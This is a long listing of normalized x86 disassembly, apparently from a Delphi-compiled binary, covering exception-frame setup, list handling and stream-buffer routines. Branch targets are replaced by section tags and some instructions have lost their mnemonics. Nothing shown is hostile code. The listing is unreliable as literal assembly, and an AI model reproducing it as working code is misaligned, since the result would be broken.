cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41d208
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41a4c4
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41a4c4
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41a30c
sub_41d240
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41a4c4
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41a4c4
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_41a358
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41a30c
sub_41d288
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41d421
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_41a82c
mov edi eax
xor edx edx
push ebp
push sub_41d402
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d409
mov eax [ rw-data ]
call sub_41a890
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41d3e3
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41d391
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_41a468
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_419fb4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d398
mov eax [ ebp - 0x8 ]
call sub_403234
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_416870
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41d208
pop ecx
mov edx esi
mov eax edi
call sub_41a358
mov eax ebx
call sub_403234
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41d140
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41d240
pop ecx
inc esi
sub_41d398
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403234
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41a468
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
sub_41d430
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41a82c
mov edi eax
xor eax eax
push ebp
push sub_41d4cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a890
retn
mov edx ebx
mov eax edi
call sub_41a468
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_41a358
mov eax esi
call sub_403234
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_408110
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41d4dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41a82c
mov edi eax
xor eax eax
push ebp
push sub_41d553
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a890
retn
mov edx ebx
mov eax edi
call sub_41a468
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_41a358
mov eax esi
call sub_403234
sub_41d584
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
pop ecx
pop edx
pop ebx
retn
sub_41d5c8
push ebx
push esi
push edi
call sub_4035c0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41cf08
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_41d604
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41f4dc
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41f5ec
call sub_41d578
sub_41d628
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_408110
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_404008
sub_41d65c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_408110
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f4dc
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41d71d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41daa0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41daa0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d724
mov eax [ ebp - 0x8 ]
call sub_403234
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41f5ec
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41d578
sub_41d74c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41d76c
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4042a4
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4034b8
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41d578
sub_41d7d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_41a82c
mov esi eax
xor edx edx
push ebp
push sub_41d844
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d84b
mov eax [ rw-data ]
call sub_41a890
retn
mov edx ebx
mov eax esi
call sub_41a468
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403234
mov edx ebx
mov eax esi
call sub_41a358
sub_41d850
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d95f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d966
lea eax [ ebp - 0x8 ]
call sub_404008
retn
xor edx edx
push ebp
push sub_41d942
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d994
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41d064
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41a468
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_4040a0
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41d140
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41a468
call sub_41d7d4
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_41a468
mov edx eax
mov eax [ rw-data ]
call sub_41a7a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_41a5b4
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41d970
push ebx
mov ebx eax
mov eax ebx
call sub_41da64
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41c4cc
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41d994
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403234
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_41a468
call sub_403234
inc edi
dec esi
jne r-xdata
sub_41d9d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_40317c
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_419afc
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4031c0
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_419b74
mov edi eax
mov edx [ esp + 0x4 ]
call sub_419a74
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403198
test al al
jne r-xdata
sub_41daa0
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41daec
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41daec
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
sub_41db3c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41db87
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41f33c
mov eax [ ebp - 0x4 ]
call sub_4042c8
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db8e
lea eax [ ebp - 0x4 ]
call sub_404008
retn
call sub_41d578
sub_41db94
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41dc34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d738
test al al
jne r-xdata
mov eax ebx
call sub_41d738
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41afd0
jmp r-xdata
mov eax ebx
call sub_41da7c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41e6a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc3b
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_41afa0
mov esi eax
mov eax ebx
call sub_41e69c
jmp r-xdata
mov eax ebx
call sub_41e5ec
mov eax ebx
call sub_41d738
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41e808
mov eax ebx
call sub_41e6a4
sub_41dc64
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4050b0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_41a30c
inc esi
dec ebx
jne r-xdata
sub_41dca0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_420d38
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4050b0
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40526c
add esp 0x4
mov edx ebx
mov eax edi
call sub_420d0c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4050b0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_420d0c
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41dd18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4050b0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41dd80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41dda0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40282c
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41dd80
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41f7d0
call sub_40282c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403234
sub_41de00
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41dee6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41f970
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41deba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41deeb
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41dda0
pop ecx
test al al
jne r-xdata
call sub_403a3c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039e8
sub_41df10
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41df88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403430
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_419fb4
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41df8d
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41dda0
pop ecx
test al al
jne r-xdata
call sub_403a3c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039e8
sub_41dfb0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41e02b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41f970
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403430
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41e030
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41dda0
pop ecx
test al al
jne r-xdata
call sub_403a3c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_4039e8
sub_41e054
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41e275
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41f300
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41f300
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41e245
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41e203
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41dca0
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41dd18
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41de00
pop ecx
push ebp
call sub_41dfb0
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41df10
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403a6c
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41dd18
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41dd18
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e27c
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40538c
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403430
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41a4c4
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41dc64
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41a30c
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41dc64
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41a30c
sub_41e208
push ebp
call sub_41dd80
pop ecx
test al al
je r-xdata
call sub_4039e8
call sub_403a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
